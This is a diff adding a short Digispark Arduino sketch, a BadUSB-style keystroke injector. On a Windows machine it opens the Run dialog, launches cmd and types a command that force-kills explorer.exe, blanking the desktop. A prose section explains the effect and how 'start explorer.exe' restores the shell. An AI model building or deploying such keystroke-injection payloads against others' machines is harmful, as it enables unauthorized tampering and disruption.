@@ -1,0 +1,43 @@
+.>                 # DigiKeyboard.print("taskkill /f /im explorer.exe");    
+
+
+
+
+#include "DigiKeyboard.h"
+
+void setup() {
+
+  DigiKeyboard.delay(3000);  // Wait for system to recognize USB
+
+  // Open Run dialog (Win + R)
+  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
+  DigiKeyboard.delay(500);
+
+  // Type CMD
+  DigiKeyboard.print("cmd");
+  DigiKeyboard.sendKeyStroke(KEY_ENTER);
+  DigiKeyboard.delay(1000);
+
+  // run explorer.exe file which will black desktop
+   DigiKeyboard.print("taskkill /f /im explorer.exe");  
+  DigiKeyboard.sendKeyStroke(KEY_ENTER);
+}
+
+void loop() {}
+
+
+
+
+
+#explorer.exe is the Windows graphical shell, which means it is the program responsible for showing and managing the desktop interface you interact with every day.
+It controls the desktop icons, taskbar, Start menu, system tray, File Explorer windows, and even the wallpaper display. 
+When you run the command taskkill /f /im explorer.exe, you are forcefully stopping this shell process. As a result, all those visual components disappear, 
+making it look like the system has gone blank.
+
+However, the operating system itself is still running in the background because core system processes 
+like the Windows kernel and essential services are not affected. This is why the computer does not shut down or crash—it simply loses its graphical interface. 
+
+When you type start explorer.exe, you are restarting the Windows shell, which reloads the desktop environment and brings back the icons, taskbar, and other
+interface elements. In simple terms, explorer.exe acts like the “control center” of the Windows user interface, and stopping it temporarily removes your
+ability to see and interact with the desktop normally. 
+
